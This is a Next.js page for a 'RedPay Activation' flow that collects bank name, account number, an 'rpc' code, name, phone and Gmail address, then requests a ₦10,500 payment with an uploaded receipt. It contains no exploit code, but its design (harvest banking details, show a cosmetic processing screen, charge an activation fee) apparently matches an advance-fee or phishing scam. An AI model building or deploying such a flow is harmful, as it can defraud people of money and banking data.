"use client"

import { useState } from "react"
import { WelcomePage } from "@/components/welcome-page"
import { BankDetailsForm } from "@/components/bank-details-form"
import { PaymentPage } from "@/components/payment-page"
import { ProcessingPage } from "@/components/processing-page"
import { StatusPage } from "@/components/status-page"
import { createSubmission } from "@/app/actions/submissions"

const PAYMENT_AMOUNT = "₦10,500"

function fileToDataUrl(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = () => resolve(reader.result as string)
    reader.onerror = reject
    reader.readAsDataURL(file)
  })
}

export interface FormData {
  bank: string
  accountNumber: string
  rpc: string
  fullName: string
  phoneNumber: string
  gmail: string
}

export default function Home() {
  const [step, setStep] = useState(0)
  const [formData, setFormData] = useState<FormData>({
    bank: "",
    accountNumber: "",
    rpc: "",
    fullName: "",
    phoneNumber: "",
    gmail: "",
  })
  const [paymentProof, setPaymentProof] = useState<File | null>(null)
  const [submissionId, setSubmissionId] = useState<number | null>(null)

  const handleFormSubmit = (data: FormData) => {
    setFormData(data)
    setStep(2)
  }

  const handlePaymentSubmit = async (proof: File) => {
    setPaymentProof(proof)
    setStep(4)
    try {
      const receiptData = await fileToDataUrl(proof)
      const result = await createSubmission({
        fullName: formData.fullName,
        phoneNumber: formData.phoneNumber,
        gmail: formData.gmail,
        bank: formData.bank,
        accountNumber: formData.accountNumber,
        rpc: formData.rpc,
        amount: PAYMENT_AMOUNT,
        receiptData,
      })
      setSubmissionId(result.id ?? null)
    } catch (err) {
      console.error("[v0] Failed to save submission:", err)
    }
  }

  const handleRetry = () => {
    setPaymentProof(null)
    setSubmissionId(null)
    setStep(3)
  }

  if (step === 0) {
    return <WelcomePage onBegin={() => setStep(1)} />
  }

  if (step === 2) {
    return <ProcessingPage onComplete={() => setStep(3)} />
  }

  if (step === 4) {
    return <StatusPage submissionId={submissionId} formData={formData} onRetry={handleRetry} />
  }

  return (
    <main className="min-h-screen bg-background">
      <div className="mx-auto max-w-md px-4 py-8">
        {/* Header */}
        <div className="mb-8 text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-primary">
            <span className="text-2xl font-bold text-primary-foreground">R</span>
          </div>
          <h1 className="text-2xl font-bold text-foreground">RedPay Activation</h1>
        </div>



        {/* Content */}
        {step === 1 && <BankDetailsForm onSubmit={handleFormSubmit} onBack={() => setStep(0)} initialData={formData} />}
        {step === 3 && <PaymentPage onSubmit={handlePaymentSubmit} onBack={() => setStep(1)} />}
      </div>
    </main>
  )
}
